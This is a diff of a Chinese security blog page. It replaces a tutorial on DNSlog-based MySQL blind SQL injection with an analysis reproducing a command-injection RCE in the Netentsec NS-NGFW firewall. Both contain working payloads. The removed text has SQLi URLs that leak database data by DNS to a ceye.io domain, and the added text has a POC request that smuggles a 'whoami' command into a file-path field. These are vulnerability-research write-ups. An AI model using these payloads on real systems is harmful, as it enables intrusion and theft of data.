@@ -22,7 +22,7 @@
     <meta name="description" content="信息安全技术博客">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>渗透技巧-使用dnslog加快盲注速度(MYSQL篇) · c1ay&#39;s blog</title>
+    <title>2021HW总结-网康NS-NGFW rce复现分析 · c1ay&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >c1ay&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">渗透技巧-使用dnslog加快盲注速度(MYSQL篇)</a>
+                <a href="#" class="post-name">2021HW总结-网康NS-NGFW rce复现分析</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            渗透技巧-使用dnslog加快盲注速度(MYSQL篇)
+            2021HW总结-网康NS-NGFW rce复现分析
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "sql注入">sql注入</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞复现">漏洞复现</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1k</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">687</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/06/30</span>
+                    <span class="post-intro-time">2021/04/29</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,37 +401,44 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="渗透技巧-使用dnslog加快盲注速度-MYSQL篇"><a href="#渗透技巧-使用dnslog加快盲注速度-MYSQL篇" class="headerlink" title="渗透技巧-使用dnslog加快盲注速度(MYSQL篇)"></a>渗透技巧-使用dnslog加快盲注速度(MYSQL篇)</h1><p><strong>sql盲注分为基于bool的盲注和基于时间的盲注，大家都知道，盲注是在页面没有显示位并且没有报错信息的时候，通过构造payload使页面返回的内容不同或者是页面响应的时间不同从而去判断出数据库中的数据，不管是bool盲注还是时间盲注，在进行判断的时候都需要一个字符一个字符的去判断，虽然二分法可以加快盲注的速度，但是还有一种更好的办法，那就是使用dnslog，具体过程如下图</strong><br><img src="http://pic.c1imber.top/blog/180630/8aC6fb4hHB.png?imageslim" alt="mark"><br><a id="more"></a><br><strong>由上图可以看出要进行dnslog注入需要几个条件：</strong></p>
-<p><strong>1.web服务器操作系统必须为windows，因为UNC这个东西是windows特有的，关于UNC的解析如下</strong></p>
-<p><strong>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。格式：<code>\\servername\sharename</code>，其中servername是服务器名。sharename是共享资源的名称。目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：<code>\\servername\sharename\directory\filename</code></strong></p>
-<p><strong>2.以mysql为例，数据库的<code>load_file</code>函数必须可用，也就是数据库用户必须要有<code>file_priv</code>权限</strong><br><img src="http://pic.c1imber.top/blog/180630/Ai4HGl7IhG.png?imageslim" alt="mark"></p>
-<p><strong>其次就是mysql的<code>secure_file_priv</code>不为NULL,有些高版本的mysql中的<code>secure_file_priv</code>默认为NULL</strong></p>
-<p><strong><code>secure_file_priv</code>特性<code>secure_file_priv</code>参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</strong></p>
-<pre><code>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出。
-当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下。
-当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制。
-</code></pre><p><img src="http://pic.c1imber.top/blog/180630/96ilB0fDlj.png?imageslim" alt="mark"></p>
-<p><strong>配置方法，在mysql配置文件中[mysqld]里追加一条<code>secure_file_priv =</code></strong><br><img src="http://pic.c1imber.top/blog/180630/mKDHhh4j1G.png?imageslim" alt="mark"></p>
-<p><strong>符合了上述的两个条件就可以使用dnslog去进行注入了，首先需要有一台自己的DNS服务器，该DNS服务器的作用是用来接收DNS查询日志，从日志中获取dnslog注入的结果，这里推荐使用知道创宇的<a href="http://ceye.io/" title="CEYE平台" target="_blank" rel="external">CEYE平台</a>，注册完成后会分配给用户一个该平台的二级域名，这个二级域名可以作为我们的DNS服务器</strong><br><img src="http://pic.c1imber.top/blog/180630/6A6EkBLkf7.png?imageslim" alt="mark"></p>
-<p><strong>以sqli-labs第九关为例，该关卡是一个时间盲注</strong><br><img src="http://pic.c1imber.top/blog/180630/FaFeEAk4Gh.png?imageslim" alt="mark"><br><strong>传统的时间盲注对网速有着一定的要求，还有就是需要一个一个字符的去判断并且会有一定的延时，效率比较低，这里使用dnslog注入来试一下</strong></p>
-<p><strong>读取数据库版本信息，payload：</strong></p>
-<pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,version(),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23
-</code></pre><p><img src="http://pic.c1imber.top/blog/180630/gACd593Dea.png?imageslim" alt="mark"><br><strong>可以在CEYE平台中的DNS Query中看到数据库版本信息</strong><br><img src="http://pic.c1imber.top/blog/180630/aGG44dKHFD.png?imageslim" alt="mark"><br><strong>注意在读取当前用户时，由于<code>root@localhost</code>里的@符号在url里面有别的含义，@符号前面的内容会被当成<code>login:password</code>的格式，所以在查询时要使用hex函数进行16进制编码，否则会查询不到，payload：</strong></p>
-<pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,(select hex(user())),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23
-</code></pre><p><img src="http://pic.c1imber.top/blog/180630/Kjh5C1FJKj.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180630/EH0dChH0IE.png?imageslim" alt="mark"><br><strong>之后进行16进行解码便能得到内容</strong><br><img src="http://pic.c1imber.top/blog/180630/9962c1bbmk.png?imageslim" alt="mark"><br><strong>读取当前的数据库</strong></p>
-<pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,database(),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23
-</code></pre><p><img src="http://pic.c1imber.top/blog/180630/3Bg8h43kcD.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180630/3hmLf064Jm.png?imageslim" alt="mark"><br><strong>读取当前数据库下的所有表，group_concat返回的查询结果中有<code>,</code>,所以要使用hex函数进行16进制编码，否则会查询不到</strong></p>
-<pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,(select hex(group_concat(table_name)) from information_schema.tables where table_schema=database()),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23
-</code></pre><p><img src="http://pic.c1imber.top/blog/180630/9j21maLE6F.png?imageslim" alt="mark"><br><strong>之后将得到的内容进行16进制解码就能获取到数据库内容了</strong><br><img src="http://pic.c1imber.top/blog/180630/AafjHEfmLj.png?imageslim" alt="mark"></p>
+        <h3 id="流传的POC"><a href="#流传的POC" class="headerlink" title="流传的POC"></a>流传的POC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">POST /directdata/direct/router HTTP/<span class="number">1.1</span></div><div class="line">Host: xxx</div><div class="line">Connection: close</div><div class="line">Cache-Control: max-age=<span class="number">0</span></div><div class="line">sec-ch-ua: <span class="string">"Google Chrome"</span>;v=<span class="string">"89"</span>, <span class="string">"Chromium"</span>;v=<span class="string">"89"</span>, <span class="string">";Not A Brand"</span>;v=<span class="string">"99"</span></div><div class="line">sec-ch-ua-mobile: ?<span class="number">0</span></div><div class="line">Upgrade-Insecure-Requests: <span class="number">1</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">89.0</span><span class="number">.4389</span><span class="number">.114</span> Safari/<span class="number">537.36</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></div><div class="line"><span class="comment">Sec-Fetch-Site: none</span></div><div class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></div><div class="line"><span class="comment">Sec-Fetch-User: ?1</span></div><div class="line"><span class="comment">Sec-Fetch-Dest: document</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span></div><div class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></div><div class="line"><span class="comment">Content-Length: 160</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">&#123;"action":"SSLVPN_Resource","method":"deleteImage","data":[&#123;"data":["/var/www/html/d.txt;whoami&gt;/var/www/html/11.txt"]&#125;],"type":"rpc","tid":17,"f8839p7rqtj":"="&#125;</span></div></pre></td></tr></table></figure>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据目录结构可以看出开发使用了Zend Freamwork php框架</p>
+<p>根据请求路由<code>/directdata/direct/router</code>定位到漏洞的入口位置：</p>
+<p>在<code>applications/directdata/controllers/DirectController.php</code>的<code>routerAction</code>方法</p>
+<p><img src="http://pic.c1imber.top/blog/20210429/Dq3nF9uPlw5K.png?imageslim" alt="mark"></p>
+<p>跟进这里<code>Ext_Direct</code>类的静态方法<code>run</code>函数：<code>Ext_Direct::run($this-&gt;getRequest())</code></p>
+<p>在<code>applications/Models/Ext/Direct.php</code>当中</p>
+<p><img src="http://pic.c1imber.top/blog/20210429/mdbNr6m0pJzy.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20210429/AVqmp1mkj039.png?imageslim" alt="mark"></p>
+<p>继续跟进这里<code>run</code>方法当中的<code>Ext_Direct_Request::factory($request)</code></p>
+<p>于是跟踪到了<code>applications/Models/Ext/Direct/Request.php</code>当中</p>
+<p><img src="http://pic.c1imber.top/blog/20210429/Fgza2sjXllW0.png?imageslim" alt="mark"></p>
+<p>这里通过<code>file_get_contents(&#39;php://input&#39;)</code>对POST过来的数据进行了接收，根据上面的POC可以得知这里接收的内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">"action"</span>:<span class="string">"SSLVPN_Resource"</span>,<span class="string">"method"</span>:<span class="string">"deleteImage"</span>,<span class="string">"data"</span>:[&#123;<span class="string">"data"</span>:[<span class="string">"/var/www/html/d.txt;whoami&gt;/var/www/html/11.txt"</span>]&#125;],<span class="string">"type"</span>:<span class="string">"rpc"</span>,<span class="string">"tid"</span>:<span class="number">17</span>,<span class="string">"f8839p7rqtj"</span>:<span class="string">"="</span>&#125;</div></pre></td></tr></table></figure>
+<p>把这串数据的<code>json_decode</code>打印出来看看是什么：</p>
+<p><img src="http://pic.c1imber.top/blog/20210429/NqyBKdLd4KQk.png?imageslim" alt="mark"></p>
+<p>可以看到经过<code>json_decode</code>处理后的数据为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">object(stdClass)<span class="comment">#1 (6) &#123;</span></div><div class="line"> [<span class="string">"action"</span>]=&gt;</div><div class="line"> string(<span class="number">15</span>) <span class="string">"SSLVPN_Resource"</span></div><div class="line"> [<span class="string">"method"</span>]=&gt;</div><div class="line"> string(<span class="number">11</span>) <span class="string">"deleteImage"</span></div><div class="line"> [<span class="string">"data"</span>]=&gt;</div><div class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</div><div class="line">   [<span class="number">0</span>]=&gt;</div><div class="line">   object(stdClass)<span class="comment">#2 (1) &#123;</span></div><div class="line">     [<span class="string">"data"</span>]=&gt;</div><div class="line">     <span class="keyword">array</span>(<span class="number">1</span>) &#123;</div><div class="line">       [<span class="number">0</span>]=&gt;</div><div class="line">       string(<span class="number">47</span>) <span class="string">"/var/www/html/d.txt;whoami&gt;/var/www/html/11.txt"</span></div><div class="line">     &#125;</div><div class="line">   &#125;</div><div class="line"> &#125;</div><div class="line"> [<span class="string">"type"</span>]=&gt;</div><div class="line"> string(<span class="number">3</span>) <span class="string">"rpc"</span></div><div class="line"> [<span class="string">"tid"</span>]=&gt;</div><div class="line"> int(<span class="number">17</span>)</div><div class="line"> [<span class="string">"f8839p7rqtj"</span>]=&gt;</div><div class="line"> string(<span class="number">1</span>) <span class="string">"="</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>所以获取到<code>$data</code>变量当中的数据符合下面这段代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (</div><div class="line">		is_object($data) &amp;&amp; $data-&gt;type &amp;&amp; $data-&gt;tid &amp;&amp; </div><div class="line">		$data-&gt;action &amp;&amp; $data-&gt;method</div><div class="line">	)</div><div class="line">	<span class="keyword">return</span> <span class="keyword">new</span> Ext_Direct_Request(</div><div class="line">		$data-&gt;type, $data-&gt;tid, $data-&gt;action, </div><div class="line">		$data-&gt;method, $data-&gt;data</div><div class="line">	);</div></pre></td></tr></table></figure>
+<p>这里主要根据获取到的数据对<code>Ext_Direct_Request</code>对象进行初始化，然后作为<code>Ext_Direct_Request::factory($request)</code>的返回值</p>
+<p><code>applications/Models/Ext/Direct/Request.php</code>：</p>
+<p><img src="http://pic.c1imber.top/blog/20210429/3BmyOIpXaVr5.png?imageslim" alt="mark"></p>
+<p>最终在执行到<code>applications/Models/Ext/Direct.php</code>当中的<code>run</code>函数的<code>call_user_func_array</code>处，调用了<code>SSLVPN_Resource</code>对象的<code>deleteImage</code>方法，传入的参数为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</div><div class="line">   [<span class="number">0</span>]=&gt;</div><div class="line">   object(stdClass)<span class="comment">#2 (1) &#123;</span></div><div class="line">     [<span class="string">"data"</span>]=&gt;</div><div class="line">     <span class="keyword">array</span>(<span class="number">1</span>) &#123;</div><div class="line">       [<span class="number">0</span>]=&gt;</div><div class="line">       string(<span class="number">47</span>) <span class="string">"/var/www/html/d.txt;whoami&gt;/var/www/html/11.txt"</span></div><div class="line">     &#125;</div><div class="line">   &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
+<p>定位到<code>SSLVPN_Resource</code>对象的相关代码，追踪到<code>applications/Models/SSLVPN/Resource.php</code>当中的<code>deleteImage</code>方法：</p>
+<p><img src="http://pic.c1imber.top/blog/20210429/tzbukxAcrCKi.png?imageslim" alt="mark"></p>
+<p>这里传入的<code>$params</code>变量内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">object(stdClass)<span class="comment">#2 (1) &#123;</span></div><div class="line">  [<span class="string">"data"</span>]=&gt;</div><div class="line">  <span class="keyword">array</span>(<span class="number">1</span>) &#123;</div><div class="line">    [<span class="number">0</span>]=&gt;</div><div class="line">    string(<span class="number">47</span>) <span class="string">"/var/www/html/d.txt;whoami&gt;/var/www/html/11.txt"</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>最终在执行<code>shell_exec</code>的时候，可控输入<code>/var/www/html/d.txt;whoami&gt;/var/www/html/11.txt</code>被拼接入<code>$cmd</code>参数，产生了命令执行</p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="https://c1aysec.github.io">c1ay</a>
-            <p>原文链接：<a href="https://c1aysec.github.io/2018/06/30/渗透技巧-使用dnslog加快盲注速度(MYSQL篇)/">https://c1aysec.github.io/2018/06/30/渗透技巧-使用dnslog加快盲注速度(MYSQL篇)/</a>
-            <p>发表日期：<a href="https://c1aysec.github.io/2018/06/30/渗透技巧-使用dnslog加快盲注速度(MYSQL篇)/">June 30th 2018, 7:02:43 pm</a>
-            <p>更新日期：<a href="https://c1aysec.github.io/2018/06/30/渗透技巧-使用dnslog加快盲注速度(MYSQL篇)/">November 8th 2019, 11:16:18 pm</a>
+            <p>原文链接：<a href="https://c1aysec.github.io/2021/04/29/2021HW总结-网康NS-NGFW rce复现分析/">https://c1aysec.github.io/2021/04/29/2021HW总结-网康NS-NGFW rce复现分析/</a>
+            <p>发表日期：<a href="https://c1aysec.github.io/2021/04/29/2021HW总结-网康NS-NGFW rce复现分析/">April 29th 2021, 11:26:56 am</a>
+            <p>更新日期：<a href="https://c1aysec.github.io/2021/04/29/2021HW总结-网康NS-NGFW rce复现分析/">April 29th 2021, 11:40:35 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -439,17 +446,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/07/17/Linux下几种反弹shell方法的总结与理解/" title= "Linux下几种反弹shell方法的总结与理解">
-                    <div class="nextTitle">Linux下几种反弹shell方法的总结与理解</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/06/07/upload-labs记录/" title= "upload-labs记录">
-                    <div class="prevTitle">upload-labs记录</div>
+                <a href= "/2021/03/15/Microsoft Exchange RCE/" title= "Microsoft Exchange RCE">
+                    <div class="prevTitle">Microsoft Exchange RCE</div>
                 </a>
             
         </li>
@@ -564,7 +566,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#渗透技巧-使用dnslog加快盲注速度-MYSQL篇"><span class="toc-number">1.</span> <span class="toc-text">渗透技巧-使用dnslog加快盲注速度(MYSQL篇)</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#流传的POC"><span class="toc-number">1.</span> <span class="toc-text">流传的POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
